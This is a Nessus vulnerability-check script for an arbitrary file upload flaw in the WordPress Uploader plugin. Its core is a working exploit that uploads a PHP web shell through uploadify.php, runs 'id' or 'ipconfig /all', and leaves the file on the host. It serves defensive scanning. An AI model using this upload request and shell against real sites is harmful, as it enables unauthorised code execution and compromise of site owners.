#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64264);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(57112);
  script_osvdb_id(88918);

  script_name(english:"Uploader Plugin for WordPress File Upload Arbitrary Code Execution");
  script_summary(english:"Attempts to upload a file to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for arbitrary
file uploads.");
  script_set_attribute(attribute:"description", value:
"The Uploader Plugin for WordPress installed on the remote host is
affected by a file upload vulnerability due to a failure to properly
verify or sanitize user-uploaded files. An unauthenticated, remote
attacker can exploit this issue to upload files with arbitrary code
and then execute them on the remote host, subject to the permissions
of the web server user id.");
  # http://packetstormsecurity.com/files/119219/WordPress-Uploader-1.0.4-Shell-Upload.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8a68dadf");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Uploader";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "uploader/uploadify/jquery.uploadify.v2.1.4.mod.js"][0] =
    make_list('Uploadify v');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".php";
vuln = FALSE;

foreach cmd (cmds)
{
  # Get path to the file uploaded for use in our reporting section
  if (cmd == 'id') upload_path = "system('pwd')";
  else upload_path = "system('dir "+ token +"')";

  # Form  our PHP file to upload
  php_shell = '--XnessusX\r\nContent-Disposition: form-data; name="Filedata";' +
    ' filename="' + token + '";\r\n\r\n' + "<?php echo('<pre>'); system('"+
    cmd +"');" + upload_path + ";?>" + '\r\n--XnessusX--\r\n';

  url = "/wp-content/plugins/uploader/uploadify/uploadify.php?folder=" + dir +
    "/wp-content/uploads&fileext=php";

 #Attempt upload
  res2 = http_send_recv3(
    method    : "POST",
    item      : dir + url,
    data      : php_shell,
    add_headers:
      make_array("Content-Type",
                 "multipart/form-data; boundary=XnessusX"),
    port         : port,
    exit_on_fail : TRUE
  );
  exp_request = http_last_sent_request();

  # Try accessing the file we created
  upload_loc = "/wp-content/uploads/";
  res2 = http_send_recv3(
    method       : "GET",
    item         : dir + upload_loc + token,
    port         : port,
     exit_on_fail : TRUE
  );
  output = res2[2];

  if (egrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    get_up_path = "" + token;

    # Extract path for reporting
    if (cmd == 'id')
    {
      get_path = strstr(output, "/");
      get_up_path = chomp(get_path) + "/" + token;
      output = strstr(output, "uid") - get_path;
    }
    else
    {
      get_path = strstr(output, "Volume in drive");
      output = strstr(output, "Windows IP") - get_path;
      get_dir = egrep(pattern:"Directory of (.+)", string:get_path);
      if(!isnull(get_dir))
         get_up_path = chomp((get_dir - " Directory of ")) + '\\' + token;
    }
    break;
  }
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  report =
    '\nNessus was able to verify the issue exists using the following request :' +
     '\n' +
     '\n' + install_url + upload_loc + token +
     '\n' +
     '\nNote that this file has not been removed by Nessus and will need to be' +
     '\nmanually deleted (' + get_up_path + ').' +
     '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\nThis file was uploaded using the following request :' +
      '\n' +
      '\n' + snip +
      '\n' + exp_request +
      '\n' + snip +
      '\n' +
      '\n' + 'The file uploaded by Nessus executed the command "'+cmd+ '"' +
      '\nwhich produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
